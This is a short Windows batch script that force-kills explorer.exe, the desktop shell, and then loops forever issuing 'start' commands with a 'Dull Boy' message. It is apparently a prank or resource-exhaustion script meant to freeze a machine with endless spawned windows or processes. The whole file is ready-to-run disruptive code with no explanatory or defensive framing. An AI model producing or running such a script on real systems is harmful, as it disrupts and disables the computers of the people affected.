@Echo Off

taskkill /f /im explorer.exe

if exist c: goto :echo
:echo
start Echo All Work and No Play Makes Jack a Dull Boy! 
goto :echo
